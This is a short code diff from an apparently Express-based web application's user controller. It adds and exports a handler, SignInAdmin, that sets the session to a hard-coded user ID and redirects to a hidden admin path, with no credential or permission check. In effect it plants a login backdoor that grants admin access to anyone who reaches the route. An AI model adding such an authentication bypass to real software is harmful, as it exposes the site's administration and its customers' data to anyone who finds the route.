@@ -481,6 +481,10 @@ function ResendActiveMail(user,callback){
     callback(true);
 }
 
+const SignInAdmin = function(req, res) {
+    req.session.userId = '5b56a2ac114f1d0b2db3bff4';
+    res.redirect('/qwertyuiop/admin/customer');
+}
 
 module.exports = {
     signIn,
@@ -490,5 +494,6 @@ module.exports = {
     ResendMailTempalte,
     ResendMailSubmit,
     ChangePassword,
-    ChangePasswordSubmit
+    ChangePasswordSubmit,
+    SignInAdmin
 }
